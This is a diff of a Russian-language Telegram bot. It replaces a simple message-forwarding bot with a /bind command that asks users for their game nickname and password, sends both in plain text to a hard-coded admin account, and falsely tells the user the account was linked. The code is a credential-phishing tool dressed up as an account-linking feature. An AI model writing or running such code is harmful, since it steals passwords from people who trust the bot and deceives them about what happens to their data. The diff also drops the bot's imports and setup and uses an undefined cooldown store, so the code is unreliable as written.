@@ -1,39 +1,51 @@
-import os
-import asyncio
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
-
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = 8070071877  # Твой ID
-
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
-
-@dp.message(Command("start"))
-async def start_handler(message: types.Message):
-    # Ответ пользователю
-    await message.answer("Привет! Твое сообщение доставлено.")
+@dp.message(Command("bind"))
+async def bind_handler(message: types.Message):
+    user_id = message.from_user.id
+    current_time = time.time()
     
-    # Уведомление лично тебе в ЛС
-    user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
-    await bot.send_message(
-        chat_id=ADMIN_ID, 
-        text=f"🔔 Пользователь {user_info} (ID: {message.from_user.id}) нажал /start!"
-    )
+    # Проверка кулдауна
+    if user_id in user_cooldowns:
+        elapsed = current_time - user_cooldowns[user_id]
+        if elapsed < 15:
+            remaining = int(15 - elapsed)
+            
+            # Отправляем сообщение-таймер
+            msg = await message.answer(f"⚠️ Подождите {remaining} сек. перед следующей попыткой.")
+            
+            # Цикл обратного отсчета
+            for i in range(remaining, 0, -1):
+                await asyncio.sleep(1)
+                try:
+                    await msg.edit_text(f"⚠️ Подождите {i} сек. перед следующей попыткой.")
+                except:
+                    break # Если пользователь удалил сообщение сам, выходим из цикла
+            
+            # Удаляем сообщение после окончания таймера
+            try:
+                await msg.delete()
+            except:
+                pass
+            return
 
-# Пересылка любого другого текста тебе в ЛС
-@dp.message()
-async def forward_to_admin(message: types.Message):
-    await message.answer("Сообщение отправлено админу!")
-    user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
-    await bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"📩 Новое сообщение от {user_info}:\n\n{message.text}"
-    )
+    # Обновляем время попытки
+    user_cooldowns[user_id] = current_time
 
-async def main():
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    args = message.text.split()
+    if len(args) < 3:
+        await message.answer("[Бот] Неверный формат! Используйте: /bind [Ник] [Пароль]")
+        return
+        
+    username = args[1]
+    password = " ".join(args[2:])
     
+    # Отправка тебе (Админу)
+    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
+    admin_msg = f"🎮 **Новая привязка**\n👤 Игрок: {tg_user}\n🏷 Ник: `{username}`\n🔑 Пароль: `{password}`"
+    
+    try:
+        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
+        await message.answer("[Бот] Аккаунт был успешно привязан!")
+    except Exception as e:
+        await message.answer("[Бот] Ошибка при отправке данных администратору.")
+        print(f"Ошибка: {e}")
+
